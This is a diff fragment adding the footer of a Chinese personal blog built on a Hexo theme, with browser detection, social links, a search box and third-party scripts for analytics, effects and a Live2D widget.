+    var regStr_saf = /safari\/[\d.]+/gi ;
+    //IE
+    if(agent.indexOf("msie") > 0)
+    {
+        return agent.match(regStr_ie) ;
+    }
+    //firefox
+    if(agent.indexOf("firefox") > 0)
+    {
+        return agent.match(regStr_ff) ;
+    }
+    //Chrome
+    if(agent.indexOf("chrome") > 0)
+    {
+        return agent.match(regStr_chrome) ;
+    }
+    //Safari
+    if(agent.indexOf("safari") > 0 && agent.indexOf("chrome") < 0)
+    {
+        return agent.match(regStr_saf) ;
+    }
+}
+</script> 
+
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Lmg66" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1052324194@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+
+<script src="/js/cursor.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/aos/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/instantpage/instantpage.js" type="module"></script>
+    
+    <script type="text/javascript">
+    var OriginTitile=document.title,st;
+    document.addEventListener("visibilitychange",function(){
+        document.hidden?(document.title="ヽ(●-`Д´-)ノ404啦",clearTimeout(st)):(document.title="(Ő∀Ő3)ノ骗你的嘿嘿！",st=setTimeout(function(){document.title=OriginTitile},3e3))
+    })
+
+</script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
